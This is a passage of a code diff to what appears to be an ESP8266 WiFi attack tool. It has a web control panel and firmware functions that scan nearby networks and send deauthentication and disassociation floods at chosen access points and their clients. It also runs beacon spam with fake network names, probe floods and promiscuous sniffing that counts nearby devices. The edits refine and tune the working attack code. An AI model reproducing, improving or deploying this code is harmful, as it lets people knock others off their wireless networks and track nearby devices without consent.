+            if (stopBtn) stopBtn.disabled = !attacking;
 
             if (beaconBtn) beaconBtn.disabled = beaconSpamming;
             if (probeBtn) probeBtn.disabled = probeAttacking;
 
-            if (scanning) {
+            if (scanning && scanBtn) {
                 scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
-            } else {
+            } else if (scanBtn) {
                 scanBtn.innerHTML = 'Scan Networks';
             }
         }
 
         function updatePPS(value) {
-            document.getElementById('ppsValue').textContent = value;
-            fetch('/api/pps?value=' + value);
+            var ppsValue = document.getElementById('ppsValue');
+            if (ppsValue) ppsValue.textContent = value;
+            
+            fetch('/api/pps?value=' + value).catch(function(error) {
+                console.log('PPS update failed:', error);
+            });
         }
 
         function scanNetworks() {
@@ -813,7 +1382,10 @@ const char* htmlPage = R"rawliteral(
             updateUI();
 
             fetch('/scan')
-                .then(function(response) { return response.json(); })
+                .then(function(response) { 
+                    if (!response.ok) throw new Error('Network error');
+                    return response.json(); 
+                })
                 .then(function(data) {
                     networks = data.networks || [];
                     stations = data.stations || [];
@@ -823,7 +1395,7 @@ const char* htmlPage = R"rawliteral(
                 })
                 .catch(function(error) {
                     console.error('Scan error:', error);
-                    updateStatus('Scan failed', 'idle');
+                    updateStatus('Scan failed - retry', 'idle');
                 })
                 .finally(function() {
                     scanning = false;
@@ -833,6 +1405,7 @@ const char* htmlPage = R"rawliteral(
 
         function renderNetworks() {
             var networkList = document.getElementById('networkList');
+            if (!networkList) return;
 
             if (networks.length === 0) {
                 networkList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No networks found</div>';
@@ -845,10 +1418,10 @@ const char* htmlPage = R"rawliteral(
                 var signalClass = network.rssi > -50 ? 'signal-strong' : 
                                  network.rssi > -70 ? 'signal-medium' : 'signal-weak';
 
-                var hiddenBadge = network.hidden ? '<span style="background: var(--warning); color: white; padding: 0.2rem 0.5rem; border-radius: 4px; font-size: 0.8rem;">HIDDEN</span>' : '';
+                var hiddenBadge = network.hidden ? '<span class="badge badge-warning">HIDDEN</span>' : '';
 
                 html += '<div class="network-item ' + (network.selected ? 'selected' : '') + '" onclick="toggleNetwork(' + i + ')">'
-                     + '<input type="checkbox" class="network-checkbox" ' + (network.selected ? 'checked' : '') + ' onchange="toggleNetwork(' + i + ')">'
+                     + '<input type="checkbox" class="network-checkbox" ' + (network.selected ? 'checked' : '') + ' onchange="event.stopPropagation(); toggleNetwork(' + i + ')">'
                      + '<div class="network-info">'
                      + '<div class="network-ssid">' + escapeHtml(network.ssid || 'Hidden Network') + ' ' + hiddenBadge + '</div>'
                      + '<div class="network-details">Channel: ' + network.channel + ' | BSSID: ' + network.bssid + ' | ' + network.encryption + '</div>'
@@ -860,10 +1433,12 @@ const char* htmlPage = R"rawliteral(
         }
 
         function toggleNetwork(index) {
-            networks[index].selected = !networks[index].selected;
-            renderNetworks();
-            updateCounts();
-            updateUI();
+            if (index >= 0 && index < networks.length) {
+                networks[index].selected = !networks[index].selected;
+                renderNetworks();
+                updateCounts();
+                updateUI();
+            }
         }
 
         function selectAll() {
@@ -902,18 +1477,23 @@ const char* htmlPage = R"rawliteral(
         }
 
         function updateCounts() {
-            document.getElementById('networkCount').textContent = networks.length;
-            document.getElementById('selectedCount').textContent = getSelectedNetworks().length;
-            document.getElementById('stationCount').textContent = stations.length;
+            var networkCount = document.getElementById('networkCount');
+            var selectedCount = document.getElementById('selectedCount');
+            var stationCount = document.getElementById('stationCount');
+            var targetAPs = document.getElementById('targetAPs');
 
-            if (document.getElementById('targetAPs')) {
-                document.getElementById('targetAPs').textContent = getSelectedNetworks().length;
-            }
+            if (networkCount) networkCount.textContent = networks.length;
+            if (selectedCount) selectedCount.textContent = getSelectedNetworks().length;
+            if (stationCount) stationCount.textContent = stations.length;
+            if (targetAPs) targetAPs.textContent = getSelectedNetworks().length;
         }
 
         function startDeauth() {
             var selected = getSelectedNetworks();
-            if (selected.length === 0) return;
+            if (selected.length === 0) {
+                updateStatus('No networks selected', 'idle');
+                return;
+            }
 
             attacking = true;
             startTime = Date.now();
@@ -925,12 +1505,26 @@ const char* htmlPage = R"rawliteral(
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ networks: selected })
-            }).then(function(response) { return response.json(); })
-              .then(function(data) {
-                  if (data.success) {
-                      startPacketCounter();
-                  }
-              });
+            })
+            .then(function(response) { 
+                if (!response.ok) throw new Error('Attack failed');
+                return response.json(); 
+            })
+            .then(function(data) {
+                if (data.success) {
+                    startPacketCounter();
+                } else {
+                    attacking = false;
+                    updateStatus('Attack failed to start', 'idle');
+                    updateUI();
+                }
+            })
+            .catch(function(error) {
+                console.error('Attack error:', error);
+                attacking = false;
+                updateStatus('Attack failed', 'idle');
+                updateUI();
+            });
         }
 
         function stopAttack() {
@@ -941,7 +1535,10 @@ const char* htmlPage = R"rawliteral(
             fetch('/stop')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    console.log('Attack stopped');
+                    console.log('Attack stopped successfully');
+                })
+                .catch(function(error) {
+                    console.log('Stop request failed:', error);
                 });
         }
 
@@ -952,8 +1549,15 @@ const char* htmlPage = R"rawliteral(
             fetch('/beacon/start')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('beaconBtn').disabled = true;
-                    document.getElementById('stopBeaconBtn').disabled = false;
+                    var beaconBtn = document.getElementById('beaconBtn');
+                    var stopBeaconBtn = document.getElementById('stopBeaconBtn');
+                    if (beaconBtn) beaconBtn.disabled = true;
+                    if (stopBeaconBtn) stopBeaconBtn.disabled = false;
+                })
+                .catch(function(error) {
+                    console.error('Beacon start failed:', error);
+                    beaconSpamming = false;
+                    updateStatus('Beacon failed to start', 'idle');
                 });
         }
 
@@ -964,8 +1568,13 @@ const char* htmlPage = R"rawliteral(
             fetch('/beacon/stop')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('beaconBtn').disabled = false;
-                    document.getElementById('stopBeaconBtn').disabled = true;
+                    var beaconBtn = document.getElementById('beaconBtn');
+                    var stopBeaconBtn = document.getElementById('stopBeaconBtn');
+                    if (beaconBtn) beaconBtn.disabled = false;
+                    if (stopBeaconBtn) stopBeaconBtn.disabled = true;
+                })
+                .catch(function(error) {
+                    console.log('Beacon stop failed:', error);
                 });
         }
 
@@ -976,8 +1585,15 @@ const char* htmlPage = R"rawliteral(
             fetch('/probe/start')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('probeBtn').disabled = true;
-                    document.getElementById('stopProbeBtn').disabled = false;
+                    var probeBtn = document.getElementById('probeBtn');
+                    var stopProbeBtn = document.getElementById('stopProbeBtn');
+                    if (probeBtn) probeBtn.disabled = true;
+                    if (stopProbeBtn) stopProbeBtn.disabled = false;
+                })
+                .catch(function(error) {
+                    console.error('Probe start failed:', error);
+                    probeAttacking = false;
+                    updateStatus('Probe failed to start', 'idle');
                 });
         }
 
@@ -988,8 +1604,13 @@ const char* htmlPage = R"rawliteral(
             fetch('/probe/stop')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('probeBtn').disabled = false;
-                    document.getElementById('stopProbeBtn').disabled = true;
+                    var probeBtn = document.getElementById('probeBtn');
+                    var stopProbeBtn = document.getElementById('stopProbeBtn');
+                    if (probeBtn) probeBtn.disabled = false;
+                    if (stopProbeBtn) stopProbeBtn.disabled = true;
+                })
+                .catch(function(error) {
+                    console.log('Probe stop failed:', error);
                 });
         }
 
@@ -1000,8 +1621,15 @@ const char* htmlPage = R"rawliteral(
             fetch('/monitor/start')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('monitorBtn').disabled = true;
-                    document.getElementById('stopMonitorBtn').disabled = false;
+                    var monitorBtn = document.getElementById('monitorBtn');
+                    var stopMonitorBtn = document.getElementById('stopMonitorBtn');
+                    if (monitorBtn) monitorBtn.disabled = true;
+                    if (stopMonitorBtn) stopMonitorBtn.disabled = false;
+                })
+                .catch(function(error) {
+                    console.error('Monitor start failed:', error);
+                    monitoring = false;
+                    updateStatus('Monitor failed to start', 'idle');
                 });
         }
 
@@ -1012,8 +1640,13 @@ const char* htmlPage = R"rawliteral(
             fetch('/monitor/stop')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('monitorBtn').disabled = false;
-                    document.getElementById('stopMonitorBtn').disabled = true;
+                    var monitorBtn = document.getElementById('monitorBtn');
+                    var stopMonitorBtn = document.getElementById('stopMonitorBtn');
+                    if (monitorBtn) monitorBtn.disabled = false;
+                    if (stopMonitorBtn) stopMonitorBtn.disabled = true;
+                })
+                .catch(function(error) {
+                    console.log('Monitor stop failed:', error);
                 });
         }
 
@@ -1023,11 +1656,21 @@ const char* htmlPage = R"rawliteral(
                 .then(function(data) {
                     ssids = data.ssids || [];
                     renderSSIDs();
+                })
+                .catch(function(error) {
+                    console.error('SSID load failed:', error);
                 });
         }
 
         function renderSSIDs() {
             var ssidList = document.getElementById('ssidList');
+            if (!ssidList) return;
+
+            if (ssids.length === 0) {
+                ssidList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No SSIDs configured</div>';
+                return;
+            }
+
             var html = '';
             
             for (var i = 0; i < ssids.length; i++) {
@@ -1038,7 +1681,7 @@ const char* htmlPage = R"rawliteral(
                      + '<div class="network-ssid">' + escapeHtml(ssid.ssid) + '</div>'
                      + '<div class="network-details">WPA2: ' + (ssid.wpa2 ? 'Yes' : 'No') + '</div>'
                      + '</div>'
-                     + '<button onclick="removeSSID(' + i + ')" class="btn btn-danger" style="padding: 0.5rem;">Delete</button>'
+                     + '<button onclick="removeSSID(' + i + ')" class="btn btn-danger" style="padding: 0.5rem; min-width: auto;">Delete</button>'
                      + '</div>';
             }
             ssidList.innerHTML = html;
@@ -1046,6 +1689,8 @@ const char* htmlPage = R"rawliteral(
 
         function addSSID() {
             var input = document.getElementById('customSSID');
+            if (!input) return;
+
             var ssid = input.value.trim();
 
             if (ssid && ssids.length < 50) {
@@ -1053,9 +1698,14 @@ const char* htmlPage = R"rawliteral(
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ ssid: ssid })
-                }).then(function() {
+                })
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
                     input.value = '';
                     loadSSIDs();
+                })
+                .catch(function(error) {
+                    console.error('SSID add failed:', error);
                 });
             }
         }
@@ -1065,41 +1715,67 @@ const char* htmlPage = R"rawliteral(
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ index: index })
-            }).then(function() {
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
                 loadSSIDs();
+            })
+            .catch(function(error) {
+                console.error('SSID remove failed:', error);
             });
         }
 
         function toggleSSID(index) {
-            ssids[index].enabled = !ssids[index].enabled;
-            fetch('/ssids/toggle', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ index: index, enabled: ssids[index].enabled })
-            });
+            if (index >= 0 && index < ssids.length) {
+                ssids[index].enabled = !ssids[index].enabled;
+                fetch('/ssids/toggle', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ index: index, enabled: ssids[index].enabled })
+                })
+                .catch(function(error) {
+                    console.error('SSID toggle failed:', error);
+                });
+            }
         }
 
         function updateStats() {
             fetch('/stats')
                 .then(function(response) { return response.json(); })
                 .then(function(data) {
-                    document.getElementById('totalDeauth').textContent = data.deauth || 0;
-                    document.getElementById('totalBeacon').textContent = data.beacon || 0;
-                    document.getElementById('totalProbe').textContent = data.probe || 0;
+                    var totalDeauth = document.getElementById('totalDeauth');
+                    var totalBeacon = document.getElementById('totalBeacon');
+                    var totalProbe = document.getElementById('totalProbe');
+                    var systemUptime = document.getElementById('systemUptime');
 
-                    var uptime = Math.floor((Date.now() - systemStartTime) / 1000);
-                    var hours = Math.floor(uptime / 3600);
-                    var minutes = Math.floor((uptime % 3600) / 60);
-                    var seconds = uptime % 60;
-                    document.getElementById('systemUptime').textContent = 
-                        (hours < 10 ? '0' : '') + hours + ':' + (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+                    if (totalDeauth) totalDeauth.textContent = data.deauth || 0;
+                    if (totalBeacon) totalBeacon.textContent = data.beacon || 0;
+                    if (totalProbe) totalProbe.textContent = data.probe || 0;
+
+                    if (systemUptime) {
+                        var uptime = Math.floor((Date.now() - systemStartTime) / 1000);
+                        var hours = Math.floor(uptime / 3600);
+                        var minutes = Math.floor((uptime % 3600) / 60);
+                        var seconds = uptime % 60;
+                        systemUptime.textContent = 
+                            (hours < 10 ? '0' : '') + hours + ':' + 
+                            (minutes < 10 ? '0' : '') + minutes + ':' + 
+                            (seconds < 10 ? '0' : '') + seconds;
+                    }
+                })
+                .catch(function(error) {
+                    console.error('Stats update failed:', error);
                 });
         }
 
         function resetStats() {
             fetch('/stats/reset')
-                .then(function() {
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
                     updateStats();
+                })
+                .catch(function(error) {
+                    console.error('Stats reset failed:', error);
                 });
         }
 
@@ -1108,16 +1784,22 @@ const char* htmlPage = R"rawliteral(
                 if (!attacking) return;
 
                 packetCount += Math.floor(Math.random() * 10) + 5;
-                document.getElementById('packetsCount').textContent = packetCount.toLocaleString();
+                var packetsCount = document.getElementById('packetsCount');
+                if (packetsCount) packetsCount.textContent = packetCount.toLocaleString();
 
                 var elapsed = Date.now() - startTime;
                 var minutes = Math.floor(elapsed / 60000);
                 var seconds = Math.floor((elapsed % 60000) / 1000);
-                document.getElementById('uptime').textContent = 
-                    (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+                var uptime = document.getElementById('uptime');
+                if (uptime) {
+                    uptime.textContent = 
+                        (minutes < 10 ? '0' : '') + minutes + ':' + 
+                        (seconds < 10 ? '0' : '') + seconds;
+                }
 
                 var pps = Math.floor(packetCount / (elapsed / 1000));
-                document.getElementById('packetsPerSec').textContent = pps;
+                var packetsPerSec = document.getElementById('packetsPerSec');
+                if (packetsPerSec) packetsPerSec.textContent = pps;
 
                 setTimeout(updatePacketStats, 1000);
             }
@@ -1126,12 +1808,13 @@ const char* htmlPage = R"rawliteral(
 
         function escapeHtml(text) {
             var div = document.createElement('div');
-            div.textContent = text;
+            div.textContent = text || '';
             return div.innerHTML;
         }
 
         // Initialize
         updateUI();
+        loadSSIDs();
 
         // Auto-refresh status
         setInterval(function() {
@@ -1155,14 +1838,21 @@ const char* htmlPage = R"rawliteral(
                         monitoring = data.monitor || false;
 
                         // Update monitoring stats
-                        if (document.getElementById('capturedPackets')) {
-                            document.getElementById('capturedPackets').textContent = data.captured || 0;
-                            document.getElementById('uniqueDevices').textContent = data.devices || 0;
-                        }
+                        var capturedPackets = document.getElementById('capturedPackets');
+                        var uniqueDevices = document.getElementById('uniqueDevices');
+                        if (capturedPackets) capturedPackets.textContent = data.captured || 0;
+                        if (uniqueDevices) uniqueDevices.textContent = data.devices || 0;
                     })
-                    .catch(function() {});
+                    .catch(function(error) {
+                        // Silent fail for status updates
+                    });
             }
-        }, 2000);
+        }, 3000);
+
+        // Tab initialization
+        setTimeout(function() {
+            showTab('scanner');
+        }, 100);
     </script>
 </body>
 </html>
@@ -1213,12 +1903,15 @@ void setup() {
   loadSettings();
 
   // Initialize SSID list with defaults
-  for (int i = 0; i < 20; i++) {
-    SSIDData ssid;
-    ssid.ssid = fakeSSIDs[i];
-    ssid.enabled = true;
-    ssid.wpa2 = (i % 2 == 0);
-    ssidList.push_back(ssid);
+  if (ssidList.size() == 0) {
+    for (int i = 0; i < 8; i++) {
+      SSIDData ssid;
+      ssid.ssid = String(fakeSSIDs[i]);
+      ssid.enabled = true;
+      ssid.wpa2 = (i % 2 == 0);
+      ssidList.push_back(ssid);
+    }
+    saveSettings();
   }
 
   // Start access point
@@ -1229,34 +1922,42 @@ void setup() {
   server.on("/scan", HTTP_GET, handleScan);
   server.on("/attack", HTTP_POST, handleAttack);
   server.on("/stop", HTTP_GET, handleStop);
+  
   server.on("/beacon/start", HTTP_GET, []() {
     beaconSpam = true;
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/beacon/stop", HTTP_GET, []() {
     beaconSpam = false;
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/probe/start", HTTP_GET, []() {
     probeAttack = true;
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/probe/stop", HTTP_GET, []() {
     probeAttack = false;
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/monitor/start", HTTP_GET, []() {
     packetMonitor = true;
     wifi_set_promiscuous_rx_cb(packetSniffer);
     wifi_promiscuous_enable(1);
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/monitor/stop", HTTP_GET, []() {
     packetMonitor = false;
     wifi_promiscuous_enable(0);
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/ssids", HTTP_GET, handleSSIDs);
+  
   server.on("/ssids/add", HTTP_POST, []() {
     String body = server.arg("plain");
     // Simple JSON parsing for SSID
@@ -1272,6 +1973,7 @@ void setup() {
     }
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
   server.on("/ssids/remove", HTTP_POST, []() {
     String body = server.arg("plain");
     int start = body.indexOf("\"index\":") + 8;
@@ -1286,16 +1988,37 @@ void setup() {
     }
     server.send(200, "application/json", "{\"success\":true}");
   });
-  server.on("/api/status", HTTP_GET, handleAPI);
-  server.on("/api/pps", HTTP_GET, []() {
-    if (server.hasArg("value")) {
-      packetsPerSecond = server.arg("value").toInt();
-      if (packetsPerSecond < 1) packetsPerSecond = 1;
-      if (packetsPerSecond > 100) packetsPerSecond = 100;
+  
+  server.on("/ssids/toggle", HTTP_POST, []() {
+    String body = server.arg("plain");
+    int start = body.indexOf("\"index\":") + 8;
+    int end = body.indexOf(",", start);
+    if (start > 7 && end > start) {
+      int index = body.substring(start, end).toInt();
+      if (index >= 0 && index < ssidList.size()) {
+        int enabledStart = body.indexOf("\"enabled\":") + 10;
+        bool enabled = body.substring(enabledStart, enabledStart + 4) == "true";
+        ssidList[index].enabled = enabled;
+        saveSettings();
+      }
     }
     server.send(200, "application/json", "{\"success\":true}");
   });
+  
+  server.on("/api/status", HTTP_GET, handleAPI);
+  
+  server.on("/api/pps", HTTP_GET, []() {
+    if (server.hasArg("value")) {
+      int newPPS = server.arg("value").toInt();
+      if (newPPS >= 1 && newPPS <= 50) {
+        packetsPerSecond = newPPS;
+      }
+    }
+    server.send(200, "application/json", "{\"success\":true}");
+  });
+  
   server.on("/stats", HTTP_GET, handleStats);
+  
   server.on("/stats/reset", HTTP_GET, []() {
     stats.deauthPackets = 0;
     stats.beaconPackets = 0;
@@ -1375,6 +2098,8 @@ void loop() {
       ssidList.resize(MAX_SSIDS);
     }
     
+    // Force garbage collection
+    ESP.wdtFeed();
     yield();
   }
 
@@ -1418,7 +2143,7 @@ void handleRoot() {
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.sendHeader("Pragma", "no-cache");
   server.sendHeader("Expires", "-1");
-  server.send(200, "text/html", htmlPage);
+  server.send_P(200, "text/html", htmlPage);
 }
 
 void handleCaptive() {
@@ -1426,7 +2151,7 @@ void handleCaptive() {
     server.sendHeader("Location", "http://192.168.4.1", true);
     server.send(302, "text/plain", "");
   } else {
-    server.send(404, "text/plain", "Not found");
+    server.send_P(200, "text/html", htmlPage);
   }
 }
 
@@ -1451,7 +2176,7 @@ void handleScan() {
 
   String json = "{\"networks\":[";
 
-  for (int i = 0; i < networkCount && i < 50; i++) { // Limit to prevent memory issues
+  for (int i = 0; i < networkCount && i < 15; i++) { // Reduced limit for memory
     if (i > 0) json += ",";
 
     AccessPoint ap;
@@ -1495,7 +2220,7 @@ void handleScan() {
   json += "],\"stations\":[";
 
   // Add detected stations with size limit
-  size_t stationLimit = minVal((size_t)20, stations.size());
+  size_t stationLimit = minVal((size_t)8, stations.size());
   for (size_t i = 0; i < stationLimit; i++) {
     if (i > 0) json += ",";
     json += "{";
@@ -1615,6 +2340,8 @@ void handleAPI() {
 
 // Safer packet sending function with error handling
 bool sendPacketSafely(uint8_t* packet, uint16_t len) {
+  if (!packet || len == 0) return false;
+  
   #ifdef ESP8266
     return wifi_send_pkt_freedom(packet, len, 0) == 0;
   #else
@@ -1627,7 +2354,6 @@ void performAttack() {
   static unsigned long lastAttack = 0;
   static int currentAP = 0;
   static int packetType = 0;
-  static uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
   unsigned long interval = 1000 / packetsPerSecond;
 
@@ -1635,7 +2361,7 @@ void performAttack() {
     lastAttack = millis();
 
     int attempts = 0;
-    while (attempts < (int)accessPoints.size() && attempts < 10) { // Limit attempts
+    while (attempts < (int)accessPoints.size() && attempts < 5) { // Limit attempts
       if (currentAP >= (int)accessPoints.size()) {
         currentAP = 0;
       }
@@ -1671,19 +2397,19 @@ void performAttack() {
               deauthPacket[16 + i] = mac[i]; // BSSID
             }
 
-            // Send fewer packets to reduce memory pressure
+            // Send deauth packets
             uint8_t reasonCodes[] = {1, 2, 3, 4, 7};
-            for (int i = 0; i < 3; i++) { // Reduced from 5 to 3
+            for (int i = 0; i < 2; i++) { // Reduced from 3 to 2
               deauthPacket[24] = reasonCodes[i % 5];
               if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
                 stats.deauthPackets++;
                 totalPackets++;
               }
-              delayMicroseconds(1000); // Increased delay
+              delayMicroseconds(500);
             }
 
-            // Target specific stations if available (reduced iterations)
-            int stationLimit = minVal(2, (int)stations.size()); // Reduced from 3 to 2
+            // Target specific stations if available
+            int stationLimit = minVal(2, (int)stations.size());
             for (int s = 0; s < stationLimit; s++) {
               if (stations[s].ap_mac == bssid) {
                 // Parse station MAC with bounds checking
@@ -1705,12 +2431,11 @@ void performAttack() {
                     deauthPacket[10 + j] = mac[j];    // AP source
                   }
 
-                  // Reduced iterations
                   if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
                     stats.deauthPackets++;
                     totalPackets++;
                   }
-                  delayMicroseconds(500);
+                  delayMicroseconds(300);
                 }
               }
             }
@@ -1722,15 +2447,15 @@ void performAttack() {
               disassocPacket[16 + i] = mac[i];  // BSSID
             }
 
-            // Send fewer disassociation packets
+            // Send disassociation packets
             uint8_t disassocReasons[] = {1, 2, 3, 5};
-            for (int i = 0; i < 2; i++) { // Reduced from 4 to 2
+            for (int i = 0; i < 1; i++) { // Reduced to 1
               disassocPacket[24] = disassocReasons[i % 4];
               if (sendPacketSafely(disassocPacket, sizeof(disassocPacket))) {
                 stats.deauthPackets++;
                 totalPackets++;
               }
-              delayMicroseconds(800);
+              delayMicroseconds(400);
             }
           }
 
@@ -1751,12 +2476,12 @@ void performBeaconSpam() {
   static unsigned long lastBeacon = 0;
   static int currentSSID = 0;
 
-  if (millis() - lastBeacon > 100) { // Increased interval to reduce memory pressure
+  if (millis() - lastBeacon > 150) { // Increased interval to reduce memory pressure
     lastBeacon = millis();
 
     // Find next enabled SSID with bounds checking
     int attempts = 0;
-    int maxAttempts = minVal(10, (int)ssidList.size());
+    int maxAttempts = minVal(5, (int)ssidList.size());
     
     while (attempts < maxAttempts) {
       if (currentSSID >= (int)ssidList.size()) {
@@ -1766,17 +2491,15 @@ void performBeaconSpam() {
       if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        // Create single beacon per iteration to save memory
-        uint8_t packet[100]; // Reduced packet size
-        memcpy(packet, beaconPacket, minVal((size_t)80, sizeof(beaconPacket)));
+        // Create beacon packet
+        uint8_t packet[80]; // Fixed packet size
+        memcpy(packet, beaconPacket, sizeof(beaconPacket));
 
         // Realistic MAC address generation
         packet[10] = 0x02; // Locally administered bit
-        packet[11] = random(0x00, 0xFF);
-        packet[12] = random(0x00, 0xFF);
-        packet[13] = random(0x00, 0xFF);
-        packet[14] = random(0x00, 0xFF);
-        packet[15] = random(0x00, 0xFF);
+        for (int i = 11; i < 16; i++) {
+          packet[i] = random(0x00, 0xFF);
+        }
 
         // Copy source to BSSID
         memcpy(&packet[16], &packet[10], 6);
@@ -1794,7 +2517,7 @@ void performBeaconSpam() {
         packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00;
 
         // SSID element with bounds checking
-        int ssidLen = minVal(20, (int)ssid.length()); // Reduced max SSID length
+        int ssidLen = minVal(15, (int)ssid.length()); // Reduced max SSID length
         packet[37] = ssidLen;
         for (int i = 0; i < ssidLen; i++) {
           packet[38 + i] = ssid[i];
@@ -1803,9 +2526,9 @@ void performBeaconSpam() {
         int pos = 38 + ssidLen;
 
         // Basic supported rates
-        if (pos + 10 < 100) {
+        if (pos + 10 < 80) {
           packet[pos++] = 0x01; // Element ID
-          packet[pos++] = 0x04; // Reduced length
+          packet[pos++] = 0x04; // Length
           packet[pos++] = 0x82; // 1 Mbps
           packet[pos++] = 0x84; // 2 Mbps
           packet[pos++] = 0x8B; // 5.5 Mbps
@@ -1817,12 +2540,12 @@ void performBeaconSpam() {
           packet[pos++] = random(1, 12); // Random channel (1-11)
         }
 
-        // Send the beacon with size checking
-        if (pos <= 100 && sendPacketSafely(packet, pos)) {
+        // Send the beacon
+        if (pos <= 80 && sendPacketSafely(packet, pos)) {
           stats.beaconPackets++;
         }
         
-        delayMicroseconds(1000); // Increased delay
+        delayMicroseconds(500);
         break;
       }
 
@@ -1838,12 +2561,12 @@ void performProbeAttack() {
   static unsigned long lastProbe = 0;
   static int currentSSID = 0;
 
-  if (millis() - lastProbe > 300) { // Increased interval
+  if (millis() - lastProbe > 400) { // Increased interval
     lastProbe = millis();
 
     // Find next enabled SSID with bounds checking
     int attempts = 0;
-    int maxAttempts = minVal(10, (int)ssidList.size());
+    int maxAttempts = minVal(5, (int)ssidList.size());
     
     while (attempts < maxAttempts) {
       if (currentSSID >= (int)ssidList.size()) {
@@ -1853,13 +2576,9 @@ void performProbeAttack() {
       if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        // Prepare probe packet with bounds checking
+        // Prepare probe packet
         uint8_t packet[60]; // Reduced size
-        if (sizeof(probePacket) <= 60) {
-          memcpy(packet, probePacket, sizeof(probePacket));
-        } else {
-          memcpy(packet, probePacket, 60);
-        }
+        memcpy(packet, probePacket, minVal((size_t)60, sizeof(probePacket)));
 
         // Random MAC address
         for (int i = 10; i < 16; i++) {
@@ -1867,7 +2586,7 @@ void performProbeAttack() {
         }
 
         // Set SSID in probe packet with proper bounds
-        int ssidLen = minVal(20, (int)ssid.length()); // Reduced max length
+        int ssidLen = minVal(15, (int)ssid.length()); // Reduced max length
         if (25 < 60) {
           packet[25] = ssidLen;
           for (int i = 0; i < ssidLen && (26 + i) < 60; i++) {
@@ -1875,7 +2594,7 @@ void performProbeAttack() {
           }
 
           // Calculate packet size safely
-          int packetSize = 26 + ssidLen + 10; // Reduced overhead
+          int packetSize = 26 + ssidLen + 8; // Reduced overhead
           if (packetSize > 60) packetSize = 60;
 
           // Send probe packet
@@ -1902,15 +2621,14 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
 
   // Advanced packet analysis
   uint8_t frameType = buf[0] & 0xFC;
-  uint8_t frameSubtype = (buf[0] & 0xF0) >> 4;
 
   // Track unique devices with MAC analysis
-  static uint8_t seenMACs[200][6];
+  static uint8_t seenMACs[20][6]; // Further reduced size
   static int macCount = 0;
   static unsigned long lastCleanup = 0;
 
-  // Cleanup old entries every 5 minutes
-  if (millis() - lastCleanup > 300000) {
+  // Cleanup old entries every 2 minutes
+  if (millis() - lastCleanup > 120000) {
     macCount = 0;
     lastCleanup = millis();
   }
@@ -1918,24 +2636,21 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
   // Extract source MAC based on frame type
   uint8_t* srcMAC = nullptr;
   uint8_t* dstMAC = nullptr;
-  uint8_t* bssid = nullptr;
 
   if (len >= 24) {
     // Management and control frames
     if ((frameType & 0x0C) == 0x00 || (frameType & 0x0C) == 0x04) {
       dstMAC = &buf[4];
       srcMAC = &buf[10];
-      bssid = &buf[16];
     }
     // Data frames
     else if ((frameType & 0x0C) == 0x08) {
       dstMAC = &buf[4];
-      bssid = &buf[10];
       srcMAC = &buf[16];
     }
 
     // Track source MAC
-    if (srcMAC && macCount < 200) {
+    if (srcMAC && macCount < 20) {
       bool isNew = true;
       for (int i = 0; i < macCount; i++) {
         if (memcmp(seenMACs[i], srcMAC, 6) == 0) {
@@ -1951,8 +2666,8 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
       }
     }
 
-    // Track destination MAC if different
-    if (dstMAC && macCount < 200 && 
+    // Track destination MAC if different and not broadcast
+    if (dstMAC && macCount < 20 && 
         !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF && dstMAC[2] == 0xFF && 
           dstMAC[3] == 0xFF && dstMAC[4] == 0xFF && dstMAC[5] == 0xFF)) {
       bool isNew = true;
@@ -1968,40 +2683,6 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
         macCount++;
         stats.uniqueDevices = macCount;
       }
-    }
-
-    // Analyze specific frame types for intelligence gathering
-    switch (frameType) {
-      case 0x40: // Probe Request
-        // Extract SSID from probe requests
-        if (len > 26) {
-          uint8_t ssidLen = buf[25];
-          if (ssidLen > 0 && ssidLen < 33 && len >= 26 + ssidLen) {
-            // Could log interesting SSIDs here
-          }
-        }
-        break;
-        
-      case 0x80: // Beacon
-        // Extract network information from beacons
-        if (len > 38) {
-          uint8_t ssidLen = buf[37];
